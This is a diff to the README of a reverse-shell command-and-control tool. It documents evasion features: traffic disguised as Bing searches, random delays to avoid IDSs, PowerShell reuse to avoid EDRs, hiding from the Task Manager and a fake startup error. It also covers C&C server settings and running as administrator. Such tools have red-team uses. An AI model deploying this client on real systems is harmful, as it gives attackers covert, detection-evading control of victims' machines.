@@ -49,14 +49,14 @@ Today, as a poc, the following functionalities are implemented:
 1. Fake HTTP traffic to appear as searches on bing.com.
 2. Commands are base64 encoded in the HTML response.
 3. The result of the commands is encoded in base64 as a cookie by the client.
-4. SSL support; by default it is a fake bing.com certificate.
-5. Random delay between each customer call to avoid triggering IDSs.
+4. [Optional] SSL support; by default it is a fake bing.com certificate.
+5. Random delay between each client call to avoid triggering IDSs.
 6. Random template is used for each response from the server.
 7. Re-use of the same powershell process to avoid triggering EDRs.
 8. Support for all Cmd and Powershell commands.
-9. The client display a fake error message at startup.
+9. [Optional] The client can display a fake error message at startup.
 10. The client is hidden from tasks manager.
-11. The client can be run as an administrator.
+11. [Optional] The client can be run as an administrator.
 
 ##### AV Detection
 
@@ -91,15 +91,24 @@ This file contains parameters ; Assign the values you want :
     class Config
         {
             // Behavior
+            # Display a fake error msg at startup
             public static bool DisplayErrorMsg = true;
+            # Title of fake error msg
             public static string ErrorMsgTitle = "This application could not be started.";
+            # Description of fake error msg
             public static string ErrorMsgDesc = "Unhandled exception has occured in your application. \r\r Object {0} is not valid.";
+            # Min delay between the client calls
             public static int MinDelay = 2;
+            # Max delay between the client calls
             public static int MaxDelay = 5;
+            # Fake uri requested - Warning : it must begin with "search" (or need a change on server side)
             public static string Url = "search?q=search+something&qs=n&form=QBRE&cvid=";
             // Listener
+            # Hostname/IP of C&C server
             public static string Server = "https://192.168.24.79";
+            # Listening port of C&C server
             public static string Port = "443";
+            # Allow self-signed or "unsecure" certificates - Warning : often needed in corporate environment using proxy
             public static bool AllowInsecureCertificate = true;
         }
 
@@ -107,14 +116,14 @@ This file contains parameters ; Assign the values you want :
 
 Change this line to run by default the client with certain privileges : 
 
-`<requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />`
+`<requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />`  
 
-With
-`<requestedExecutionLevel  level="asInvoker" uiAccess="false" />`
-or
-`<requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />`
-or
-`<requestedExecutionLevel  level="highestAvailable" uiAccess="false" />`
+With  
+`<requestedExecutionLevel  level="asInvoker" uiAccess="false" />`  
+or  
+`<requestedExecutionLevel  level="requireAdministrator" uiAccess="false" />`  
+or  
+`<requestedExecutionLevel  level="highestAvailable" uiAccess="false" />`  
 
 **Projet properties**
 
@@ -150,7 +159,7 @@ Simply change the port or location on the certificate if needed in the config se
 `python HARS_Server.py`
 
 #### Notes
--HTTP Logs are located in `Http Asynchronous Reverse Shell\HARS_Server\logs`\
+-HTTP Logs are located in `Http Asynchronous Reverse Shell\HARS_Server\logs`\  
 -You can add your own templates (any html page) in `Http Asynchronous Reverse Shell\HARS_Server\templates`
 
 ------------
